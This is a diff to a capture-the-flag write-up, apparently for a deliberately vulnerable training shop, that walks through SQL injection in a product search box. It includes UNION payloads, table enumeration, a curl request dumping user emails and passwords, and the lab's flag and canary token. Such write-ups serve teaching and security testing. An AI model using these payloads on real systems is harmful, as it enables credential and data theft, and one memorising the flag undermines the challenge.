@@ -15,7 +15,7 @@ description: How to exploit a vulnerability in a tiny search box to quietly expo
 
 ## Introduction
 
-This writeup walks through a SQL injection in the product search feature. The search input gets dropped straight into a raw SQL query with no sanitization, so you can manipulate the query to pull data from other tables and grab the flag.
+This writeup walks through a SQL injection in the product search feature. The search input gets dropped straight into a raw SQL query with no sanitization, so you can manipulate the query to pull data from tables the catalogue never touches. A payload that merely looks like SQL earns nothing here: the flag is handed over only once the response carries a row the search could never have returned.
 
 ## Table of contents
 
@@ -75,9 +75,23 @@ Now try this payload:
 ' UNION SELECT 1,2,3,4,5--
 ```
 
-If the page renders without errors, you're in. The single quote broke out of the `LIKE` clause, and the `UNION SELECT` merged in.
+A row of `1,2,3,4,5` shows up among the products: the single quote broke out of the `LIKE` clause and the `UNION SELECT` merged in. The response also tells you the injection is not the finish line:
 
-![SQL injection payload submitted in search box](../../assets/images/product-search-sql-injection/sql-injection-test.png)
+```json
+{
+  "message": "SQL syntax detected in the search term. The flag tracks one specific internal secret, and it is not in these rows."
+}
+```
+
+Getting the column count wrong is just as informative, because SQLite's error comes straight back:
+
+```json
+{
+  "error": "Raw query failed. Code: `1`. Message: `SELECTs to the left and right of UNION do not have the same number of result columns`"
+}
+```
+
+Five columns it is.
 
 ### UNION-based data extraction
 
@@ -96,6 +110,68 @@ Same thing via curl:
 ```bash
 curl "http://localhost:3000/api/products/search?q=DELIVERED%27%20UNION%20SELECT%20id%2C%20email%2C%20password%2C%20role%2C%20addressId%20FROM%20users--"
 ```
+
+### Schema enumeration
+
+Credentials are loot, not the flag. What the endpoint rewards is reading a row no product search would ever return, so ask SQLite what else lives in there:
+
+```
+' UNION SELECT 1, group_concat(name), 'x', 1, 'y' FROM sqlite_master WHERE type='table'--
+```
+
+```
+users,products,carts,cart_items,orders,order_items,addresses,flags,hints,revealed_hints,reviews,support_access_tokens,found_flags,project_init,visitor_logs,wishlists,wishlist_items,password_reset_tokens,supplier_orders,coupons,gift_cards,stream_config,sqlite_sequence,internal_secrets
+```
+
+`flags` is a dead end: any payload naming that table gets a `403`, and every `OSS{…}` value is stripped out of the response before it leaves the server. `internal_secrets` is the one to look at:
+
+```
+' UNION SELECT 1, sql, 'x', 1, 'y' FROM sqlite_master WHERE name='internal_secrets'--
+```
+
+```sql
+CREATE TABLE "internal_secrets" ("id" TEXT NOT NULL PRIMARY KEY, "slug" TEXT NOT NULL, "token" TEXT NOT NULL)
+```
+
+The schema names a `slug` column but says nothing about its values. Read those rather than guessing them:
+
+```
+' UNION SELECT 1, group_concat(slug), 'x', 1, 'y' FROM internal_secrets--
+```
+
+```
+product-search-sql-injection,second-order-sql-injection,sql-injection,x-forwarded-for-sql-injection
+```
+
+One row per injection challenge, each named after the challenge it belongs to.
+
+### Claiming the flag
+
+This endpoint only looks for its own token, so ask for the `product-search-sql-injection` row:
+
+```
+' UNION SELECT 1, token, 'x', 1, 'y' FROM internal_secrets WHERE slug='product-search-sql-injection'--
+```
+
+```json
+{
+  "products": [
+    {
+      "id": "cmu07q2xd007miex2czfyuyzr",
+      "name": "CANARY-PRODUCT-SEARCH-SQL-INJECTION-d12a4cdea6d3",
+      "description": "x",
+      "price": "1",
+      "imageUrl": "y"
+    }
+  ],
+  "flag": "OSS{pr0duct_s34rch_sql_1nj3ct10n}",
+  "message": "Internal secret exfiltrated through the product search! Well done!"
+}
+```
+
+The token is generated when the lab is seeded, so it differs on every instance — returning it is proof the query ran.
+
+Dropping the `WHERE` works just as well: all four rows come back and the endpoint finds its own token among them. The filter keeps the response readable, it is not a requirement.
 
 ## Vulnerable code analysis
 
